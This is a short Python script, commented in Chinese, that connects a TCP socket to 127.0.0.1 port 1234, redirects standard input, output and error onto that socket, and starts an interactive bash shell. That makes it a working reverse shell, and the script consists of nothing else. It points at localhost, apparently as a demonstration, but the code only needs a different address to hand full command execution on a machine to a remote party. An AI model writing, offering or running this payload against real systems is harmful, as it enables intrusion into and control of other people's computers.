import os

if __name__ == '__main__':
    import os, socket, subprocess

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('127.0.0.1', 1234))
    # 重定向shell输出
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    # 执行子程序
    p = subprocess.call(['/bin/bash', '-i'])
